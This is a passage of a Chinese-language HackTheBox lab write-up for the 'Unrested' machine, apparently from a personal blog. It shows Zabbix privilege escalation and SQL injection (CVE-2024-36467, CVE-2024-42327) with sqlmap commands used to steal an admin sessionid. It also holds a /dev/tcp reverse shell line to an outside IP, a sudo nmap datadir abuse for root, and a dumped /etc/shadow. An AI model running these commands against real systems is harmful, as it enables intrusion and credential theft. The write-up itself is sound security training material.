class="string">&quot;13&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;id&quot;</span>: 1,</span><br><span class="line">  <span class="string">&quot;auth&quot;</span>: <span class="string">&quot;12c257f1ff2d8330def226f13880c492&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>不過這樣會有一個問題，如果增加多個組會導致權限衝突，最後就只是應用到一個組中：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206035210-wmuwer2.png" alt="image">​</p>
+<p>所以暴力增加不少一個好選擇，然後繼續翻了下文檔，看到 管理員在組 7 ：<a target="_blank" rel="noopener" href="https://www.zabbix.com/documentation/7.0/en/manual/api/reference/user/get?hl=user.get">https://www.zabbix.com/documentation/7.0/en/manual/api/reference/user/get?hl=user.get</a></p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206040141-ih37j3l.png" alt="image">​</p>
+<h2 id="Add-current-user-to-zabbix-administrators-group-cve-2024-36467"><a href="#Add-current-user-to-zabbix-administrators-group-cve-2024-36467" class="headerlink" title="Add current user to zabbix administrators group (cve-2024-36467)"></a>Add current user to zabbix administrators group (cve-2024-36467)</h2><p>既然知道管理員是組7，那麽就自己給自己加進去組7：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206040236-y00j58i.png" alt="image">​</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;jsonrpc&quot;</span>: <span class="string">&quot;2.0&quot;</span>,</span><br><span class="line">  <span class="string">&quot;method&quot;</span>: <span class="string">&quot;user.update&quot;</span>,</span><br><span class="line">  <span class="string">&quot;params&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;userid&quot;</span>: <span class="string">&quot;3&quot;</span>,</span><br><span class="line">    <span class="string">&quot;usrgrps&quot;</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">&quot;usrgrpid&quot;</span>: <span class="string">&quot;7&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;id&quot;</span>: 1,</span><br><span class="line">  <span class="string">&quot;auth&quot;</span>: <span class="string">&quot;12c257f1ff2d8330def226f13880c492&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然後使用 <code>usergroup.get</code>​ 看看是否增加成功，如果成功了就會返回當前用戶所在的組：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206040251-c72xl85.png" alt="image">​</p>
+<p>由於是把自己加入了 <code>zabbix administrators</code>​ 這個組，猜測這個組有特權，嘗試看看能不能看到其他用戶，所以使用 <code>user.get</code>​ 看一看：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206042006-oaz80d4.png" alt="image">​</p>
+<p>好像可以查詢到所有用戶。</p>
+<h2 id="SQLi-in-user-get-to-get-admin-sessionid-CVE-2024-42327"><a href="#SQLi-in-user-get-to-get-admin-sessionid-CVE-2024-42327" class="headerlink" title="SQLi in user.get to get admin sessionid (CVE-2024-42327)"></a>SQLi in user.get to get admin sessionid (CVE-2024-42327)</h2><p>由於第一個 CVE 説的就是 <code>user.get</code>​，既然可以查詢到所有用戶，那麽就嘗試看看有沒有 SQL 注入，這裏的 payload 就是一開始的 <a target="_blank" rel="noopener" href="https://github.com/compr00t/CVE-2024-42327">exploit</a> 提供的。</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206042813-rp7ck6u.png" alt="image">​</p>
+<p>發送後結果真的卡了5秒，也就是說 SQli 是存在的，所以把注入的地方使用 <code>*</code>​ 來告訴 <code>sqlmap</code>​，然後保存到文件并且使用 <code>sqlmap</code>​ 跑一下：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206043101-ohpt4vx.png" alt="image">​</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sqlmap -r req.txt</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206043158-1rw6g1a.png" alt="image">​</p>
+<p>結果 <code>sqlmap</code>​ 識別成功了，由於是 <code>time-based injection</code>​，所以速度非常慢，非常依賴網絡延遲，乾脆就看一下有什麽數據庫：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sqlmap -r req.txt --dbs --batch --threads 10</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] zabbix</span><br></pre></td></tr></table></figure>
+
+<p>那麽問題就來了，需要從數據庫裏面得到什麽？由於每次登錄的時候都需要輸入賬號密碼，從而得到一個 <code>sessionid</code>​，所以可以嘗試偷 admin 的<code>sessionid</code>​，這樣就可以使用 api 來做一些奇怪的東西。</p>
+<p>問題是 admin 的 <code>sessionid</code>​ 會藏在數據庫的哪裏呢？由於這個框架是開源的，所以可以直接去 <code>github</code>​ 快速搜索一下初始化框架時執行的 <code>sql</code>​，這裏就是 <code>schema.sql</code>​：<a target="_blank" rel="noopener" href="https://github.com/unix1986/zabbix/blob/master/database/mysql/schema.sql">https://github.com/unix1986/zabbix/blob/master/database/mysql/schema.sql</a></p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206044039-5thiupk.png" alt="image">​</p>
+<p>看到表名是 <code>sessions</code>​，所以直接使用 sqlmap 來指定表名并且 dump 一下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sqlmap -r req.txt -D zabbix -T sessions --dump  --batch --threads 10</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206045544-qo5mjk4.png" alt="image">​</p>
+<p>成功的獲得了一個 <code>sessionid</code>​，然後試一下：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206045605-tvida89.png" alt="image">​</p>
+<p>很可惜過期了，所以真正的<code>sessionid</code>​應該是最後的一條記錄，也就是底部，這裏可以直接使用 <code>--sql-shell</code>​ ，只需要一行 sql 語法就可以快速獲取最後一個 admin 的<code>sessionid</code>​：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sqlmap -r req.txt --sql-shell --batch</span><br><span class="line">sql-shell&gt; <span class="keyword">select</span> sessionid from sessions <span class="built_in">where</span> userid = 1 ORDER BY userid DESC LIMIT 1</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206050055-hphl333.png" alt="image">​</p>
+<p>獲得后嘗試一下，</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206050036-xt7pr6v.png" alt="image">​</p>
+<p>結果成功了獲得了 admin 的 <code>sessionid</code>​。</p>
+<h2 id="Add-item-to-trigger-command-execution"><a href="#Add-item-to-trigger-command-execution" class="headerlink" title="Add item to trigger command execution"></a>Add item to trigger command execution</h2><p>既然成功了，老樣子直接使用api來運行命令行，先看一下那些主機是允許運行的：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206050136-h8gx6yz.png" alt="image">​</p>
+<h3 id="Command-execution-with-script-execute"><a href="#Command-execution-with-script-execute" class="headerlink" title="Command execution with script.execute"></a>Command execution with script.execute</h3><p>谷歌查了一下，找到這個：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/39937">https://www.exploit-db.com/exploits/39937</a></p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206050257-e7h2dg7.png" alt="image">​</p>
+<p>新建脚本沒問題，</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206050348-1ssq5p7.png" alt="image">​</p>
+<p>但是運行的時候失敗了，因爲在新版本不允許使用 script 來運行命令行，需要在配置文件中開啓 <code>EnableGlobalScripts</code>​ 才可以這樣玩。</p>
+<h3 id="Command-execution-with-item"><a href="#Command-execution-with-item" class="headerlink" title="Command execution with item"></a>Command execution with item</h3><p>繼續谷歌搜索找到了這個：<a target="_blank" rel="noopener" href="https://github.com/Diefunction/ZabbixAPIAbuse">https://github.com/Diefunction/ZabbixAPIAbuse</a></p>
+<p>脚本裏面需要登陸，由於只有session id，沒有管理員的賬號密碼，所以改一下脚本，强制返回 session id：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206050825-1e9bkyq.png" alt="image">​</p>
+<p>運行后嘗試一下：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206050955-tkd402r.png" alt="image">​</p>
+<p>看來脚本沒問題，而且也得到了 rce ，這樣就隨便寫一個 reverse shell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&#x27;(/bin/bash -i &gt;&amp; /dev/tcp/10.10.16.31/2222 0&gt;&amp;1 &amp;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>就可以得到shell：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206052106-j00b8lc.png" alt="image">​</p>
+<h1 id="Shell-as-zabbix"><a href="#Shell-as-zabbix" class="headerlink" title="Shell as zabbix"></a>Shell as zabbix</h1><p>直接 sudo 看看，</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206052129-fd9xecc.png" alt="image">​</p>
+<p>結果看到了 <code>nmap</code>​ 允許sudo，那就嘗試尋找 <a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/nmap/">gtfobins</a></p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206065816-wljpt9b.png" alt="image">​</p>
+<p>運行後出現：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206065848-6zyr6tz.png" alt="image">​</p>
+<p>不對啊，我記得nmap沒有這種功能，於是看了一下路徑：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206065940-xu76een.png" alt="image">​</p>
+<p>原來是脚本限制了，好在有 <code>--datadir</code>​ ：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206055223-4v2x0ew.png" alt="image">​</p>
+<h2 id="Exploit-nmap-datadir-to-got-root-shell"><a href="#Exploit-nmap-datadir-to-got-root-shell" class="headerlink" title="Exploit nmap datadir to got root shell"></a>Exploit nmap datadir to got root shell</h2><p>當你使用 <code>-sV</code>​ 這個參數去掃描一些ip，<code>nmap</code>​ 就會去 <code>datadir</code>​ 裏面執行一些脚本，nmap 默認的<code>datadir</code>​是 <code>/usr/share/nmap/</code>​，由於可以指定 <code>datadir</code>​ 所以可以直接複製一份，然後修改裏面的内容讓他執行 shell ，那麽問題來了，我要怎麽知道他執行哪個文件？</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zabbix@unrested:~$ <span class="built_in">cp</span> -r /usr/share/nmap/ nmap_data</span><br></pre></td></tr></table></figure>
+
+<p>可以在本地中開啓一個 <code>python3 -m http.server 2222</code>​ 然後用 <code>nmap</code>​ 掃描，脚本掃描時肯定會有特徵，所以根據特徵就可以找到哪個脚本。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zabbix@unrested:~$ sudo nmap -sV --datadir nmap_data 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206055501-uzkzncz.png" alt="image">​</p>
+<p>掃一下后，看到有一個 <code>nmaplowercheck</code>​ 的關鍵子，也就是說某個脚本裏有一個關鍵字是 <code>nmaplowercheck</code>​，使用 <code>grep</code>​ 快速定位到那個脚本，找到了之後就快速插入一行shell：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">zabbix@unrested:~/nmap_data$ grep <span class="string">&quot;nmaplowercheck&quot;</span> -ri .</span><br><span class="line">./nselib/http.lua:  <span class="built_in">local</span> URL_404_1 = <span class="string">&#x27;/nmaplowercheck&#x27;</span> .. os.time(os.date(<span class="string">&#x27;*t&#x27;</span>))</span><br><span class="line"></span><br><span class="line">zabbix@unrested:~/nmap_data$ vi ./nselib/http.lua</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206055702-50xbnh2.png" alt="image">​</p>
+<p>保存了之後再掃描一次，就得到了root：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zabbix@unrested:~$ sudo /usr/bin/nmap -sC 10.10.16.31 -p 80 --datadir ~/nmap_data/ </span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/hackthebox/2024/12-7pmsfwmgQ4TWeJYD-Unrested/image-20241206055829-mla5wrp.png" alt="image">​</p>
+<h1 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">root@unrested:/home/matthew<span class="comment"># cat /etc/shadow</span></span><br><span class="line">root:$y$j9T<span class="variable">$c8kZZUmgmWhR3zrBUruWk</span>.<span class="variable">$F60sAZkReUe</span>/ENg78gKNGDZq2hEqQtTa7LMjvP8hjeD:20058:0:99999:7:::</span><br><span class="line">daemon:*:19405:0:99999:7:::</span><br><span class="line">bin:*:19405:0:99999:7:::</span><br><span class="line">sys:*:19405:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:19405:0:99999:7:::</span><br><span class="line">games:*:19405:0:99999:7:::</span><br><span class="line">man:*:19405:0:99999:7:::</span><br><span class="line">lp:*:19405:0:99999:7:::</span><br><span class="line">mail:*:19405:0:99999:7:::</span><br><span class="line">news:*:19405:0:99999:7:::</span><br><span class="line">uucp:*:19405:0:99999:7:::</span><br><span class="line">proxy:*:19405:0:99999:7:::</span><br><span class="line">www-data:*:19405:0:99999:7:::</span><br><span class="line">backup:*:19405:0:99999:7:::</span><br><span class="line">list:*:19405:0:99999:7:::</span><br><span class="line">irc:*:19405:0:99999:7:::</span><br><span class="line">gnats:*:19405:0:99999:7:::</span><br><span class="line">nobody:*:19405:0:99999:7:::</span><br><span class="line">_apt:*:19405:0:99999:7:::</span><br><span class="line">systemd-network:*:19405:0:99999:7:::</span><br><span class="line">systemd-resolve:*:19405:0:99999:7:::</span><br><span class="line">messagebus:*:19405:0:99999:7:::</span><br><span class="line">systemd-timesync:*:19405:0:99999:7:::</span><br><span class="line">pollinate:*:19405:0:99999:7:::</span><br><span class="line">sshd:*:19405:0:99999:7:::</span><br><span class="line">syslog:*:19405:0:99999:7:::</span><br><span class="line">uuidd:*:19405:0:99999:7:::</span><br><span class="line">tcpdump:*:19405:0:99999:7:::</span><br><span class="line">tss:*:19405:0:99999:7:::</span><br><span class="line">landscape:*:19405:0:99999:7:::</span><br><span class="line">fwupd-refresh:*:19405:0:99999:7:::</span><br><span class="line">usbmux:*:19474:0:99999:7:::</span><br><span class="line">lxd:!:19474::::::</span><br><span class="line">zabbix:!:20057:0:99999:7:::</span><br><span class="line">Debian-snmp:!:20057:0:99999:7:::</span><br><span class="line">mysql:!:20057:0:99999:7:::</span><br><span class="line">matthew:$y$j9T<span class="variable">$WmZMyb</span>.b4HYA0F5zAK0mo/<span class="variable">$pQqQW4</span>/PIuLo05BtRdw3SroRYHire.simH0G7khOOz9:20058:0:99999:7:::</span><br><span class="line">_laurel:!:20059::::::</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="Thanks"><a href="#Thanks" class="headerlink" title="Thanks"></a>Thanks</h1><p><strong>Respect</strong>: If my writeup really helps you, <a target="_blank" rel="noopener" href="https://app.hackthebox.com/users/463126">Give me a respect</a> to let me know， Thankssssss!</p>
+<p><strong>感謝</strong>: 製作不易，如果我的writeup真的幫到你了, <a target="_blank" rel="noopener" href="https://app.hackthebox.com/users/463126">給我一個respect</a>，這樣我就會知道，感謝你！</p>
+
+    <iframe src="/maneplugin/badge/htb.html" style="border:none; height: 70px" title="description"></iframe>
+
+
+<p><strong>Found Mistakes</strong>: If you find something wrong in the page, please feel free email to <a href="mailto:&#x6d;&#x61;&#x6e;&#101;&#x40;&#x6d;&#x61;&#110;&#x65;&#115;&#101;&#x63;&#46;&#99;&#x6f;&#109;">&#x6d;&#x61;&#x6e;&#101;&#x40;&#x6d;&#x61;&#110;&#x65;&#115;&#101;&#x63;&#46;&#99;&#x6f;&#109;</a> thanksss !!!</p>
+<p><strong>發現一些錯誤</strong>: 如果你在文章中發現一些錯誤，請發郵件到 <a href="mailto:&#109;&#97;&#x6e;&#101;&#x40;&#x6d;&#97;&#x6e;&#101;&#x73;&#101;&#x63;&#46;&#99;&#111;&#x6d;">&#109;&#97;&#x6e;&#101;&#x40;&#x6d;&#97;&#x6e;&#101;&#x73;&#101;&#x63;&#46;&#99;&#111;&#x6d;</a> ，麻煩了！！</p>
+<p><strong>Beginner Recommand</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">If you are a beginner, please use this link to sign up for an HTB Academy to get more Higher level of knowledge.</a></p>
+<p><strong>新手非常推薦</strong>: <a target="_blank" rel="noopener" href="https://referral.hackthebox.com/mz8fyQS">如果你是初學者，可以用此鏈接來嘗試注冊 HTB Academy 賬號。</a></p>
+<p>使用上面的鏈接加入 HTB 的 academy 就可以免費看 Tire 0 的所有教程，這對初學者來説是很友好的。 （建議先完成 INTRODUCTION TO ACADEMY）</p>
+<p>Join HTB’s academy with this link to get free access to all the tutorials for Tire 0. This is very beginner friendly. (It is recommended to complete INTRODUCTION TO ACADEMY first)</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <script>
+        setTimeout(() => {
+          makeList({
+             'target': '#toc-mobile',   // Selector for element to place table of contents
+             'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+          });
+        }, 1000);
+      </script>
+    
+    <div id="toc-footer" style="display: none">
+      <div id="toc-mobile"></div>
+    </div>
+
+    <style>
+        #toc-mobile {
+        }
+        #toc-mobile ul {
+           display: grid ! important;
+        }
+        #toc-mobile li {
+           margin: 0 0 0 0 ! important;
+        }
+        #toc-mobile .level-1 {
+           color: #00b4dd ;
+        }
+        #toc-mobile .level-2 {
+           color: #2bbc8a;
+        }
+        #toc-mobile .level-3 {
+           color: #40474b;
+        }
+        #toc-mobile .level-4, #toc-mobile .level-5, #toc-mobile .level-6 {
+           color: #8c8c8c;
+        }
+    </style>
+
+
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2024/12/06/2024-htb-machine/49-Unrested/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2024/12/06/2024-htb-machine/49-Unrested/&text=HackTheBox - Machine - Unrested"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2024/12/06/2024-htb-machine/49-Unrested/&title=HackTheBox - Machine - Unrested"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2024/12/06/2024-htb-machine/49-Unrested/&is_video=false&description=HackTheBox - Machine - Unrested"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Machine - Unrested&body=Check out this article: https://manesec.github.io/2024/12/06/2024-htb-machine/49-Unrested/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2024/12/06/2024-htb-machine/49-Unrested/&title=HackTheBox - Machine - Unrested"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2024/12/06/2024-htb-machine/49-Unrested/&title=HackTheBox - Machine - Unrested"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2024/12/06/2024-htb-machine/49-Unrested/&title=HackTheBox - Machine - Unrested"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2024/12/06/2024-htb-machine/49-Unrested/&title=HackTheBox - Machine - Unrested"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2024/12/06/2024-htb-machine/49-Unrested/&name=HackTheBox - Machine - Unrested&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2024/12/06/2024-htb-machine/49-Unrested/&t=HackTheBox - Machine - Unrested"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+      
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+  
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    manesec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Add space -->
+<script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    // listen to any DOM change and automatically perform spacing via MutationObserver()
+    pangu.autoSpacingPage();
+  });
+</script>
+
+<!-- fancybox support -->
+
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
